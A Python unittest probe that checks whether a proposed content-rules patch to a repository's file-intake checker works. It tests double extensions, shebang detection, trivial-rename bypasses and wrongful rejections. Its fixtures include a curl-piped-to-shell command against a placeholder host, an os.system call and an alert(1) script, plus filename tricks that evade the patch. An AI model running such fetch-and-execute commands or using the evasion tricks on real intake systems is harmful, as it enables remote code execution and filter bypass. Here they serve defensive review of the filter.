"""Skeptic #3 probe for CR-F2 (content-rules lens). No network.

INTAKE_TREE in {current (e495837, the finder's line numbers), head (origin/main dbb9dcf),
patched (e495837 + the finder's content-rules.patch)} selects the checker copy through the
house fixture at <tree>/tests/test_public_intake.py, exactly as the house tests load it.

R_*  reproduce what the finder observed (green now; refused only when patched).
N_*  the SAME BYTES under a plain allowed name, or fenced in RESULT.md, are green in every
     tree: the property the finder wants is a property of names, not of bytes.
B_*  the patch is bypassed by a one-character change of name or a leading newline.
W_*  plausible legitimate packages the patch newly refuses (wrong rejection).
K_*  the guarantee the code actually states (final-suffix allow-list, mode 100644) holds
     in every tree.
"""
import base64
import importlib.util
import os
import sys
import unittest
from pathlib import Path

TREE = Path(__file__).resolve().parent / os.environ.get('INTAKE_TREE', 'current')
spec = importlib.util.spec_from_file_location('house_tests', TREE / 'tests/test_public_intake.py')
house = importlib.util.module_from_spec(spec)
spec.loader.exec_module(house)
intake = house.intake
assert Path(intake.__file__).resolve() == (TREE / 'tools/public_intake_check.py').resolve(), intake.__file__
PATCHED = hasattr(intake, 'REFUSED_INNER_SUFFIXES')

PY = b'import os\nos.system("id")\n'
SH = b'#!/bin/sh\ncurl https://example.invalid | sh\n'
NB = b'{"cells": [], "metadata": {}, "nbformat": 4, "nbformat_minor": 5}\n'
HTML = b'<html><body><script>alert(1)</script></body></html>\n'


class Probe(unittest.TestCase):
    # the house fixture, method by method, so the API faking is identical to the house tests
    for _n in ('setUp', 'save', 'install', 'install_source', 'run_check', 'reject'):
        if hasattr(house.IntakeTests, _n):
            locals()[_n] = getattr(house.IntakeTests, _n)
    del _n

    def green(self):
        result = self.run_check()
        self.assertEqual(result['lane'], 'incoming')
        self.assertEqual(result['scientific_effect'], 'NONE')
        return result

    def add(self, name, raw):
        self.raw[name] = raw
        self.save()

    def each(self, cases):
        for name, raw in cases:
            with self.subTest(name=name):
                old = self.raw.copy()
                self.add(name, raw)
                yield name
                self.raw = old

    # R: reproduction --------------------------------------------------------------------
    def test_R_double_extension_and_shebang_green_unpatched_refused_patched(self):
        for name in self.each([('run.py.txt', PY), ('notebook.ipynb.json', NB), ('page.html.md', HTML),
                               ('bundle.tar.gz.txt', b'payload\n'), ('chart.svg.txt', b'<svg/>\n')]):
            self.reject('refused file type') if PATCHED else self.green()
        for _ in self.each([('setup.txt', SH)]):
            self.reject('shebang') if PATCHED else self.green()

    # N: name-independence ---------------------------------------------------------------
    def test_N_same_bytes_under_plain_names_green_in_every_tree(self):
        for _ in self.each([('run.txt', PY), ('run.md', PY), ('setup.txt', PY), ('notebook.json', NB),
                            ('page.md', HTML), ('page.txt', HTML), ('chart.txt', b'<svg/>\n')]):
            self.green()

    def test_N_result_md_documenting_the_command_with_fenced_scripts_green_in_every_tree(self):
        # CONTRIBUTING step 3 asks RESULT.md to describe 'the exact source commit, command or method'.
        self.raw['RESULT.md'] = (b'# Result\nReplayed with\n\n```sh\n' + SH + b'```\n\n```python\n' + PY +
                                 b'```\nScientific effect NONE.\n')
        self.save()
        self.green()

    def test_N_base64_zip_in_txt_green_in_every_tree(self):
        # the one case the word 'encode' in CONTRIBUTING literally names; the finder concedes it
        self.add('bundle.txt', base64.b64encode(house.zip_archive() if hasattr(house, 'zip_archive') else PY) + b'\n')
        self.green()

    # B: bypasses of the patch -----------------------------------------------------------
    def test_B_patch_bypassed_by_trivial_renames_and_a_leading_newline(self):
        for _ in self.each([('run_py.txt', PY), ('run.py .txt', PY), ('run.py-txt.txt', PY), ('run.python.txt', PY),
                            ('notebook.nb.json', NB), ('page.htm5.md', HTML), ('bundle.tgz2.txt', b'payload\n')]):
            self.green()
        for _ in self.each([('setup.txt', b'\n' + SH), ('setup.txt', b'# setup\n' + SH), ('setup.txt', b'\xef\xbb\xbf' + SH)]):
            self.green()

    # W: wrong rejections introduced by the patch ----------------------------------------
    def test_W_plausible_legitimate_names_refused_only_when_patched(self):
        png = house.png() if hasattr(house, 'png') else None
        cases = [('series.ts.csv', b't,v\n0,1\n'),                     # time-series table
                 ('README.pl.md', b'# Wynik\nefekt naukowy NONE\n'),       # i18n suffix convention
                 ('bundle.tar.gz.sha256.txt', b'0' * 64 + b'  bundle.tar.gz\n'),  # checksum of an archive kept elsewhere
                 ('notebook.ipynb.md', b'# converted notebook\n')]         # nbconvert --to markdown
        if png:
            cases.append(('chart.svg.png', png))                          # rasterised SVG, valid PNG bytes
        for _ in self.each(cases):
            self.reject('refused file type') if PATCHED else self.green()

    def test_W_command_transcript_starting_with_shebang_refused_only_when_patched(self):
        for _ in self.each([('command.txt', b'#!/usr/bin/env python3\n# exact replay entry point, quoted for review\n')]):
            self.reject('shebang') if PATCHED else self.green()

    # K: the stated guarantee holds in every tree ----------------------------------------
    def test_K_final_suffix_allow_list_and_regular_mode_hold_in_every_tree(self):
        for _ in self.each([('run.py', PY), ('notebook.ipynb', NB), ('page.html', HTML), ('plot.svg', b'<svg/>'),
                            ('bundle.tar.gz', b'x'), ('run.txt.py', PY), ('a.exe', b'MZ'), ('run', PY)]):
            self.reject('unsupported file extension')
        entry = self.api.routes[f'/repos/{house.REPO}/git/trees/{house.HEAD}?recursive=1']['tree'][0]
        entry.update(mode='100755')
        self.reject('regular non-executable')


if __name__ == '__main__':
    print(f'[probe] tree={TREE.name} patched={PATCHED} checker={intake.__file__}', file=sys.stderr)
    unittest.main()
